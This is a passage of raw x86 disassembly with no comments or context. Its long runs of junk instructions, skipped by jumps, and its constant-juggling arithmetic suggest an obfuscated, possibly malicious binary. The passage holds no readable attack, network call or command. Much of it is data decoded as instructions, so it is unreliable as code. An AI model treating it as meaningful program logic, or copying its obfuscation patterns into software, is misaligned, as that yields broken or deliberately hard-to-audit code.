  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
  40e541:	jb     0x40e5b1
  40e543:	frstor [ebx]
  40e545:	adc    ch,BYTE PTR [esi]
  40e547:	(bad)  
  40e549:	push   es
  40e54a:	mov    esi,0xbec299be
  40e54f:	mov    esi,0x8c862b7d
  40e554:	push   edi
  40e555:	shl    BYTE PTR [edi-0x5994696a],1
  40e55b:	mov    BYTE PTR [esi+0x3c],bl
  40e55e:	and    ah,ch
  40e560:	addr16 (bad) 
  40e562:	nop
  40e563:	in     al,0xb8
  40e565:	fnsave [ebx+0x7d]
  40e568:	int    0x40
  40e56a:	jecxz  0x40e59f
  40e56c:	(bad)  
  40e56d:	xchg   esp,eax
  40e56e:	test   eax,0x2d086712
  40e573:	jp     0x40e554
  40e575:	(bad)  
  40e576:	(bad)  
  40e577:	aas    
  40e578:	push   0xe4d97c4c
  40e57d:	sub    eax,0xb93f8bf5
  40e582:	outs   dx,BYTE PTR ds:[esi]
  40e583:	push   es
  40e584:	mov    DWORD PTR [edi+0x3a215bde],esp
  40e58a:	in     eax,0x7a
  40e58c:	test   eax,0xcf136860
  40e591:	adc    ecx,esi
  40e593:	and    edi,edx
  40e595:	test   eax,0x4cf033b
  40e59a:	sub    esi,edx
  40e59c:	int3   
  40e59d:	xchg   BYTE PTR [edx-0x14c0f3e7],cl
  40e5a3:	dec    ah
  40e5a5:	(bad)  
  40e5a6:	call   0x8a15ddac
  40e5ab:	das    
  40e5ac:	adc    ch,BYTE PTR [ebx-0x34]
  40e5af:	outs   dx,DWORD PTR ds:[esi]
  40e5b0:	leave  
  40e5b1:	xor    BYTE PTR [ebx+edx*8],al
  40e5b4:	popf   
  40e5b5:	(bad)  [ebx]
  40e5b7:	push   es
  40e5b8:	cmp    edi,0x52
  40e5bb:	and    DWORD PTR [ecx+0x1d],edx
  40e5be:	loope  0x40e63e
  40e5c0:	mov    BYTE PTR [esi+0x4b],bh
  40e5c3:	or     dl,dl
  40e5c5:	adc    BYTE PTR [esi+0x15],0x1b
  40e5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ca:	pop    ecx
  40e5cb:	popf   
  40e5cc:	cmp    ch,BYTE PTR [esp+eax*8]
  40e5cf:	xchg   edx,eax
  40e5d0:	mov    ecx,0xbaf14aef
  40e5d5:	and    al,0x10
  40e5d7:	js     0x40e599
  40e5d9:	cmp    eax,0xf881fb9f
  40e5de:	mov    cl,0x6b
  40e5e0:	aad    0x46
  40e5e2:	xor    ch,BYTE PTR [ebp-0x5d]
  40e5e5:	pop    esp
  40e5e6:	inc    ebx
  40e5e7:	js     0x40e59b
  40e5e9:	jmp    0xadde:0x6de59133
  40e5f0:	in     al,dx
  40e5f1:	pop    DWORD PTR [ecx+ebp*8+0x1055fa75]
  40e5f8:	mov    ch,0x1c
  40e5fa:	outs   dx,BYTE PTR ds:[esi]
  40e5fb:	out    dx,eax
  40e5fc:	or     esp,esi
  40e5fe:	imul   ecx,DWORD PTR [ebx-0x19],0x2ee58b24
  40e605:	dec    eax
  40e606:	(bad)  
  40e607:	in     al,0xeb
  40e609:	sbb    cl,BYTE PTR [ecx-0x44]
  40e60c:	ja     0x40e63d
  40e60e:	and    eax,0xb4002d00
  40e613:	(bad)  
  40e614:	pop    esp
  40e615:	jmp    0x40e65e
  40e617:	or     dh,BYTE PTR [edi+edi*8-0x78a3b21b]
  40e61e:	or     ebp,DWORD PTR [ebx+0x5f]
  40e621:	cwde   
  40e622:	dec    edx
  40e623:	xchg   DWORD PTR [edi],esp
  40e625:	mov    eax,DWORD PTR [eax+0x712c44d1]
  40e62b:	mov    al,0xbf
  40e62d:	jecxz  0x40e684
  40e62f:	dec    edi
  40e630:	mov    WORD PTR [ebx],es
  40e632:	scas   al,BYTE PTR es:[edi]
  40e633:	jnp    0x40e5b9
  40e635:	aas    
  40e636:	add    al,0xac
  40e638:	jns    0x40e611
  40e63a:	xor    al,0xec
  40e63c:	repnz push edx
  40e63e:	dec    ecx
  40e63f:	inc    eax
  40e640:	add    BYTE PTR [ecx],bl
  40e642:	ss jno 0x40e694
  40e645:	xchg   edx,eax
  40e646:	imul   ecx,ecx,0x22bf81ae
  40e64c:	mov    cl,0xf5
  40e64e:	push   0xffffff8a
  40e650:	out    0xaf,eax
  40e652:	inc    ebp
  40e653:	dec    ecx
  40e654:	sub    al,BYTE PTR [esi+0x6b]
  40e657:	bound  ebx,QWORD PTR [ebx+0x26]
  40e65a:	inc    edi
  40e65b:	lods   al,BYTE PTR ds:[esi]
  40e65c:	test   al,0x96
  40e65e:	inc    ebx
  40e65f:	mov    ah,0x91
  40e661:	clc    
  40e662:	push   edi
  40e663:	out    dx,eax
  40e664:	in     eax,0x43
  40e666:	out    0x92,eax
  40e668:	pop    ds
  40e669:	outs   dx,BYTE PTR ds:[esi]
  40e66a:	loope  0x40e67b
  40e66c:	mov    ah,0x54
  40e66e:	shl    DWORD PTR [edx],1
  40e670:	mov    al,ds:0xc52d1af4
  40e675:	adc    BYTE PTR [eax-0x266d9ed2],dl
  40e67b:	cwde   
  40e67c:	pop    esp
  40e67d:	ins    DWORD PTR es:[edi],dx
  40e67e:	add    al,0xea
  40e680:	xchg   edx,eax
  40e681:	push   esp
  40e682:	and    eax,DWORD PTR [ecx+0x8]
  40e685:	xchg   ebx,eax
  40e686:	test   al,0xaf
  40e688:	mov    bh,0xf9
  40e68a:	test   DWORD PTR [ebx-0x9],esp
  40e68d:	cmp    al,0xc2
  40e68f:	and    eax,0x810a2bd9
  40e694:	mov    ecx,0x2c9054fa
  40e699:	and    dl,0x29
  40e69c:	adc    DWORD PTR [ecx+0x60],ebp
  40e69f:	fbstp  TBYTE PTR [esi]
  40e6a1:	aas    
  40e6a2:	xor    DWORD PTR [ebx+0x3e],eax
  40e6a5:	call   0xc3af:0xdbe439af
  40e6ac:	stc    
  40e6ad:	xor    eax,0xa40dcb48
  40e6b2:	ins    BYTE PTR es:[edi],dx
  40e6b3:	mov    ds:0xdc1ba256,al
  40e6b8:	pushf  
  40e6b9:	mov    ds:0x4278467c,eax
  40e6be:	mov    dh,0x76
  40e6c0:	cmp    al,0x5d
  40e6c2:	outs   dx,DWORD PTR ds:[esi]
  40e6c3:	mov    ebx,0x865d1a5e
  40e6c8:	in     al,0xd8
  40e6ca:	out    0x6a,eax
  40e6cc:	gs ins DWORD PTR es:[edi],dx
  40e6ce:	loop   0x40e71d
  40e6d0:	mov    eax,0xdf6261b2
  40e6d5:	sub    ebx,eax
  40e6d7:	ja     0x40e6df
  40e6d9:	sub    al,0x58
  40e6db:	lods   al,BYTE PTR ds:[esi]
  40e6dc:	stos   DWORD PTR es:[edi],eax
  40e6dd:	into   
  40e6de:	scas   al,BYTE PTR es:[edi]
  40e6df:	shl    ah,cl
  40e6e1:	or     eax,0x63982cb4
  40e6e6:	div    esi
  40e6e8:	sub    edx,DWORD PTR [edx]
  40e6ea:	cmc    
  40e6eb:	sbb    bh,BYTE PTR [edi]
  40e6ed:	popf   
  40e6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6ef:	mov    ebp,ebp
  40e6f1:	psubq  mm0,QWORD PTR [eax]
  40e6f4:	(bad)  
  40e6f5:	sar    DWORD PTR [ebp-0x674b47d3],1
  40e6fb:	xchg   esi,eax
  40e6fc:	in     al,dx
  40e6fd:	or     al,0xc0
  40e6ff:	test   eax,0x57789c59
  40e704:	inc    edx
  40e705:	in     al,0x6d
  40e707:	ret    0xe8a0
  40e70a:	call   0xfac7d48e
  40e70f:	inc    ebp
  40e710:	aaa    
  40e711:	test   ax,0xb598
  40e715:	sub    BYTE PTR [ecx+0x133e304d],bh
  40e71b:	call   0x80eb0c68
  40e720:	mov    dl,0x41
  40e722:	gs data16 mov ah,0xde
  40e726:	loope  0x40e6ae
  40e728:	mov    DWORD PTR [edx-0xfc47a0f],0x9e98fc52
  40e732:	add    BYTE PTR [esi+0x3b],bl
  40e735:	push   esp
  40e736:	xchg   edi,eax
  40e738:	push   ebx
  40e739:	mov    esi,0x371374e3
  40e73e:	push   ebp
  40e73f:	xchg   ebx,eax
  40e740:	(bad)  
  40e741:	retf   0xacaa
  40e744:	add    DWORD PTR [edi],edx
  40e746:	jae    0x40e7a9
  40e748:	xor    dl,dh
  40e74a:	int    0xee
  40e74c:	push   edi
  40e74d:	ins    BYTE PTR es:[edi],dx
  40e74e:	sub    eax,0x8a824d68
  40e753:	xor    DWORD PTR [ebx+0x2775175b],ecx
  40e759:	mov    ebx,0xf893afc1
  40e75e:	icebp  
  40e75f:	mov    ds:0xad8baadf,al
  40e764:	adc    bh,ah
  40e766:	jmp    0x40e7c7
  40e768:	or     al,BYTE PTR [ebx]
  40e76a:	mov    ebx,0x42274646
  40e76f:	xchg   esp,eax
  40e770:	sbb    ecx,eax
  40e772:	adc    al,0xc5
  40e774:	push   es
  40e775:	es ds int 0x6
  40e779:	dec    esp
  40e77a:	inc    edx
  40e77b:	jg     0x40e7cc
  40e77d:	or     eax,0xa492c286
  40e782:	aaa    
  40e783:	fdivr  QWORD PTR [ebx]
  40e785:	sub    ebx,DWORD PTR [eax]
  40e787:	pop    esi
  40e788:	push   edi
  40e789:	or     BYTE PTR [ebp+0x76],dh
  40e78c:	lods   eax,DWORD PTR ds:[esi]
  40e78d:	rcl    BYTE PTR [eax+0x390ef44],0xb2
  40e794:	dec    ebp
  40e795:	mov    esi,0xdeb1e40b
  40e79a:	sti    
  40e79b:	rcr    DWORD PTR [ebx-0x3abc81dc],cl
  40e7a1:	mov    ds:0xa9f46e81,al
  40e7a6:	adc    al,0xf5
  40e7a8:	xor    ebp,DWORD PTR [edx-0x5f]
  40e7ab:	push   0xfd9e2014
  40e7b0:	rol    BYTE PTR [ebx-0x31576452],cl
  40e7b6:	mov    ah,0xda
  40e7b8:	inc    eax
  40e7b9:	pop    es
  40e7ba:	jp     0x40e742
  40e7bc:	sub    eax,0x75da6bdd
  40e7c1:	fstp   TBYTE PTR [eax+0x43d2]
  40e7c7:	sub    eax,ecx
  40e7c9:	add    eax,DWORD PTR [ebp+0xc]
  40e7cc:	xor    edx,edx
  40e7ce:	add    eax,DWORD PTR [ebp-0x14]
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax+0x382397cf]
  40e85d:	xchg   edx,eax
  40e85e:	stos   BYTE PTR es:[edi],al
  40e85f:	or     bh,BYTE PTR [esi-0x413bfe42]
  40e865:	mov    esi,0xdca261ef
  40e86a:	pop    edx
  40e86b:	in     eax,dx
  40e86c:	jle    0x40e8e0
  40e86e:	aad    0xe1
  40e870:	inc    esp
  40e871:	sti    
  40e872:	xchg   esp,eax
  40e873:	lods   eax,DWORD PTR ds:[esi]
  40e874:	js     0x40e7ff
  40e876:	add    DWORD PTR [edi],0x4
  40e879:	je     0x40e878
  40e87b:	ja     0x40e8cb
  40e87d:	mov    edi,0x8325db2d
  40e882:	xor    bl,BYTE PTR [edi+0x1dbbe1d2]
  40e888:	xor    BYTE PTR [esi+0x73],dl
  40e88b:	fdivp  st(7),st
  40e88d:	dec    esp
  40e88e:	enter  0xe66d,0x43
  40e892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e893:	mov    esi,0x2f208ea7
  40e898:	lock xchg esp,eax
  40e89a:	dec    eax
  40e89b:	ret    0x4aff
  40e89e:	dec    esp
  40e89f:	mov    esi,0x50fa6a18
  40e8a4:	jnp    0x40e8f5
  40e8a6:	mov    BYTE PTR [ebx],bl
  40e8a8:	popa   
  40e8a9:	cmc    
  40e8aa:	mov    esi,0xa04e73bc
  40e8af:	mov    dl,0x25
  40e8b1:	out    0x4a,eax
  40e8b3:	jns    0x40e89e
  40e8b5:	mov    ch,0x3a
  40e8b7:	data16 mov bl,0xba
  40e8ba:	stc    
  40e8bb:	aas    
  40e8bc:	xor    DWORD PTR [ebx-0x58],ecx
  40e8bf:	adc    eax,0x1057bf37
  40e8c4:	and    bh,al
  40e8c6:	sti    
  40e8c7:	add    ecx,DWORD PTR [eax-0x7]
  40e8ca:	test   al,0x84
  40e8cc:	aaa    
  40e8cd:	lds    edx,FWORD PTR [ebp+0x56]
  40e8d0:	hlt    
  40e8d1:	mov    edx,0xc92189ca
  40e8d6:	push   cs
  40e8d7:	clc    
  40e8d8:	lds    edi,FWORD PTR [edx-0x139288bc]
  40e8de:	jbe    0x40e93c
  40e8e0:	mov    esp,0xeea106c4
  40e8e5:	pusha  
  40e8e6:	sub    eax,0x3adb31c8
  40e8eb:	xlat   BYTE PTR ds:[ebx]
  40e8ec:	call   0xbceb:0x75371d7
  40e8f3:	cs scas eax,DWORD PTR es:[edi]
  40e8f5:	sbb    edx,DWORD PTR [ebp+edi*1+0x72]
  40e8f9:	cmp    DWORD PTR [edi],0xfffffff8
  40e8fc:	adc    ah,BYTE PTR [esi+0x6d]
  40e8ff:	mov    BYTE PTR ds:0xb562d41d,0xf2
  40e906:	dec    BYTE PTR [ebx-0x76808c83]
  40e90c:	ins    DWORD PTR es:[edi],dx
  40e90d:	inc    ecx
  40e90e:	inc    esp
  40e90f:	sub    al,0x86
  40e911:	mov    cs,WORD PTR [esp+eax*2]
  40e914:	shl    edi,cl
  40e916:	lods   eax,DWORD PTR ds:[esi]
  40e917:	pop    ds
  40e918:	mov    eax,0xc5346ecd
  40e91d:	test   al,0xa0
  40e91f:	arpl   WORD PTR [edi-0xf],sp
  40e922:	scas   al,BYTE PTR es:[edi]
  40e923:	mov    eax,ds:0xc3e95f30
  40e928:	push   ecx
  40e929:	mov    WORD PTR [esi+ebp*1-0x4c],ss
  40e92d:	and    eax,0xc2eb152d
  40e932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e933:	retf   0x484b
  40e936:	jl     0xf7191f7f
  40e93c:	loope  0x40e974
  40e93e:	stc    
  40e93f:	sahf   
  40e940:	out    0xc4,al
  40e942:	cmp    al,0xd1
  40e944:	aas    
  40e945:	aaa    
  40e946:	clc    
  40e947:	call   0x2a2d:0x56cea581
  40e94e:	push   edi
  40e94f:	sbb    DWORD PTR [edi-0x3b],edx
  40e952:	test   BYTE PTR [ebp+0x1081aeec],al
  40e958:	fcom   DWORD PTR [edx+ebx*4]
  40e95b:	mov    eax,0xccb7d687
  40e960:	sub    eax,0xb4f07bb6
  40e965:	dec    ebx
  40e967:	cs inc esp
  40e969:	mov    al,ds:0xfe498376
  40e96e:	popa   
  40e96f:	dec    ebp
  40e970:	sbb    ebx,esp
  40e972:	adc    ah,BYTE PTR [eax]
  40e974:	arpl   dx,sp
  40e976:	cld    
  40e977:	xchg   ecx,eax
  40e978:	xor    al,0x94
  40e97a:	mov    edi,esp
  40e97c:	ja     0x40e931
  40e97e:	sar    esi,cl
  40e980:	jge    0x40e911
  40e982:	dec    edi
  40e983:	das    
  40e984:	fidiv  WORD PTR [esi+0x40665127]
  40e98a:	sbb    BYTE PTR [ebp-0xd934b9],bl
  40e990:	mov    bl,0x36
  40e992:	pop    edx
  40e993:	and    DWORD PTR [eax],ebx
  40e995:	jne    0x40ea00
  40e997:	sub    eax,0x286447bd
  40e99c:	(bad)  
  40e99d:	pop    ss
  40e99e:	std    
  40e99f:	push   ecx
  40e9a0:	jns    0x40e9c5
  40e9a2:	scas   eax,DWORD PTR es:[edi]
  40e9a3:	mov    bh,0x43
  40e9a5:	es cli 
  40e9a7:	add    eax,0x91740436
  40e9ac:	cdq    
  40e9ad:	mov    WORD PTR [edx],es
  40e9af:	int3   
  40e9b0:	out    dx,eax
  40e9b1:	cwde   
  40e9b2:	(bad)  
  40e9b3:	mov    esp,0xf2c6223e
  40e9b8:	stos   DWORD PTR es:[edi],eax
  40e9b9:	stos   DWORD PTR es:[edi],eax
  40e9ba:	mov    dl,BYTE PTR [edi]
  40e9bc:	push   edx
  40e9bd:	adc    DWORD PTR cs:[edx],ebx
  40e9c0:	adc    al,0x21
  40e9c2:	outs   dx,DWORD PTR cs:[esi]
  40e9c4:	(bad)  [edi]
  40e9c6:	fstp   QWORD PTR [eax]
  40e9c8:	test   ebp,edx
  40e9ca:	sub    DWORD PTR [eax+ebx*1],0x7e511391
  40e9d1:	mov    ds:0xb3512e37,al
  40e9d6:	mov    ah,bh
  40e9d8:	pop    eax
  40e9d9:	push   edx
  40e9da:	or     DWORD PTR [esi-0x75e6a174],ecx
  40e9e0:	es std 
  40e9e2:	and    eax,0xc53561cf
  40e9e7:	jne    0x40ea28
  40e9e9:	and    ecx,esp
  40e9eb:	push   ebx
  40e9ec:	ins    BYTE PTR es:[edi],dx
  40e9ed:	repnz push cs
  40e9ef:	pop    esp
  40e9f0:	xchg   edi,eax
  40e9f1:	in     al,dx
  40e9f2:	rcr    DWORD PTR [esi+0x6],0xac
  40e9f6:	jae    0x40ea3e
  40e9f8:	not    esi
  40e9fa:	sbb    ecx,DWORD PTR [edx-0x2b135289]
  40ea00:	(bad)  
  40ea01:	fwait
  40ea02:	xor    dl,0xde
  40ea05:	ins    DWORD PTR es:[edi],dx
  40ea06:	inc    esp
  40ea07:	clc    
  40ea08:	arpl   WORD PTR [edx+0x64351163],ax
  40ea0e:	aaa    
  40ea0f:	jno    0x40e9b7
  40ea11:	sbb    al,0x23
  40ea13:	jo     0x40e9cb
  40ea15:	cmp    BYTE PTR [edx],ah
  40ea17:	loopne 0x40ea13
  40ea19:	mov    ds:0xca028207,al
  40ea1e:	mov    al,ds:0xb11bf6df
  40ea23:	xor    al,BYTE PTR [ebp+ebp*2+0x9]
  40ea27:	shl    DWORD PTR [ebx],1
  40ea29:	sub    ecx,ecx
  40ea2b:	sub    DWORD PTR [eax-0x3a],edi
  40ea2e:	call   0xd6b22149
  40ea33:	mov    dl,0xc5
  40ea35:	dec    edx
  40ea36:	ins    DWORD PTR es:[edi],dx
  40ea37:	(bad)  
  40ea38:	out    dx,al
  40ea39:	fdiv   st,st(4)
  40ea3b:	cmp    DWORD PTR [esi-0x5d451e9],0xffffffae
  40ea42:	sbb    eax,0x461066d0
  40ea47:	lods   al,BYTE PTR ds:[esi]
  40ea48:	pop    eax
  40ea49:	imul   DWORD PTR [eax+0x3514cbf6]
  40ea4f:	outs   dx,DWORD PTR ds:[esi]
  40ea50:	sti    
  40ea51:	inc    ecx
  40ea52:	jnp    0x40ea8f
  40ea54:	mov    WORD PTR [edx],?
  40ea56:	jns    0x40ea22
  40ea58:	mov    ebp,0x77c42384
  40ea5d:	mov    ah,0xfb
  40ea5f:	fcmove st,st(6)
  40ea61:	mov    BYTE PTR [edi],cl
  40ea63:	xchg   ecx,eax
  40ea64:	mov    dh,0x85
  40ea66:	cmp    eax,0xc97becb0
  40ea6b:	and    BYTE PTR [esi+0x74851fa7],ah
  40ea71:	pop    esi
  40ea72:	scas   al,BYTE PTR es:[edi]
  40ea73:	push   ecx
  40ea74:	or     BYTE PTR [ebx+0x20c72940],bh
  40ea7a:	or     ebp,edx
  40ea7c:	scas   eax,DWORD PTR es:[edi]
  40ea7d:	jmp    0xdcba:0x7e3b5a93
  40ea84:	push   ecx
  40ea85:	ror    DWORD PTR [eax+0x6ce45985],cl
  40ea8b:	mov    al,0x3b
  40ea8d:	stos   DWORD PTR es:[edi],eax
  40ea8e:	pop    ss
  40ea8f:	pop    es
  40ea90:	pop    eax
  40ea91:	sub    al,0xc3
  40ea93:	mov    dl,0x77
  40ea95:	aas    
  40ea96:	fidivr DWORD PTR [ebx]
  40ea98:	jb     0x40ea93
  40ea9a:	adc    edi,ebx
  40ea9c:	add    al,dl
  40ea9e:	je     0x40eaeb
  40eaa0:	push   ecx
  40eaa1:	pop    es
  40eaa2:	in     al,dx
  40eaa3:	inc    eax
  40eaa4:	or     ch,BYTE PTR [edx+0x20]
  40eaa7:	shl    DWORD PTR [eax+0x0],1
  40eaaa:	imul   ebx,DWORD PTR [edi],0x63b1e47e
  40eab0:	loop   0x40eaab
  40eab2:	mov    esp,0x7d0d0abb
  40eab7:	and    bl,BYTE PTR [edx]
  40eab9:	call   0x6996eb81
  40eabe:	mov    eax,ebx
  40eac0:	xchg   ebp,eax
  40eac1:	add    dh,BYTE PTR [ecx]
  40eac3:	sub    DWORD PTR [ebx-0x5f],edx
  40eac6:	dec    edx
  40eac7:	mov    ds:0x503b1718,al
  40eacc:	dec    eax
  40eacd:	inc    edi
  40eace:	sar    DWORD PTR [eax-0x61],0xcf
  40ead2:	inc    esi
  40ead3:	loopne 0x40eaf8
  40ead5:	fld    TBYTE PTR [edx]
  40ead7:	sbb    esi,esi
  40ead9:	popa   
  40eada:	push   es
  40eadb:	dec    esp
  40eadc:	mov    ah,0xc5
  40eade:	lods   eax,DWORD PTR ds:[esi]
  40eadf:	inc    edx
  40eae0:	mov    edi,0xfca7bc5f
  40eae5:	mov    eax,ds:0xf04174ca
  40eaea:	adc    eax,DWORD PTR [ebx-0x35]
  40eaed:	mov    ?,WORD PTR [eax+0x2ff6c01b]
  40eaf3:	add    BYTE PTR [ecx-0x1d5c7b79],bh
  40eaf9:	punpckhbw mm7,QWORD PTR [ebx+0xb]
  40eafd:	cmp    BYTE PTR [ecx+0x1f],al
  40eb00:	push   ebx
  40eb01:	xchg   BYTE PTR [ecx],bl
  40eb03:	pop    edi
  40eb04:	pop    ebx
  40eb05:	jnp    0x40eaf0
  40eb07:	fiadd  WORD PTR [eax]
  40eb09:	leave  
  40eb0a:	xchg   edi,esi
  40eb0c:	fs mov edi,eax
  40eb0f:	pop    ss
  40eb10:	pop    es
  40eb11:	std    
  40eb12:	(bad)  
  40eb13:	shl    BYTE PTR ss:[edi],cl
  40eb16:	fst    DWORD PTR [esi+0x141955d6]
  40eb1c:	mov    ebp,0x1b191540
  40eb21:	add    dx,WORD PTR [eax-0x5e]
  40eb25:	cmp    eax,0x59d4a967
  40eb2a:	jbe    0x40eb45
  40eb2c:	(bad)  
  40eb2d:	sub    BYTE PTR [ecx],al
  40eb2f:	lahf   
  40eb30:	pop    ss
  40eb31:	push   0xc73c20c5
  40eb36:	out    0x34,eax
  40eb38:	cmp    eax,0x869f04e3
  40eb3d:	(bad)  
  40eb3e:	retf   0xb081
  40eb41:	loope  0x40eb7e
  40eb43:	(bad)  
  40eb44:	mov    cl,0x55
  40eb46:	inc    edx
  40eb47:	dec    ecx
  40eb48:	push   cs
  40eb49:	addr16 pushf 
  40eb4b:	ins    BYTE PTR es:[edi],dx
  40eb4c:	xchg   bh,dl
  40eb4e:	mul    DWORD PTR [edi]
  40eb50:	lds    edi,FWORD PTR ds:0x85caaf8d
  40eb56:	cs mov bh,cl
  40eb59:	stc    
  40eb5a:	fimul  DWORD PTR [ebp+edi*1-0x2f73a1a8]
  40eb61:	hlt    
  40eb62:	(bad)  
  40eb63:	lods   eax,DWORD PTR ds:[esi]
  40eb64:	sub    DWORD PTR [eax],esi
  40eb66:	and    ebp,DWORD PTR [edx-0x2cc6d8e7]
  40eb6c:	daa    
  40eb6d:	dec    esp
  40eb6e:	scas   al,BYTE PTR es:[edi]
  40eb6f:	loop   0x40eb4a
  40eb71:	retf   0x47f8
  40eb74:	stc    
  40eb75:	xchg   ebp,eax
  40eb76:	aam    0xc
  40eb78:	push   0x546aa99d
  40eb7d:	pop    esi
  40eb7e:	cwde   
  40eb7f:	(bad)  
  40eb80:	jne    0x40eb09
  40eb82:	sub    edi,DWORD PTR [edx+0x58]
  40eb85:	lea    esp,[eax]
  40eb87:	add    al,BYTE PTR [edx-0x384fffdc]
  40eb8d:	inc    ebp
  40eb8e:	mov    al,ds:0x4197
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x422708
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x422708
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
  40ed43:	xor    edx,0x2021
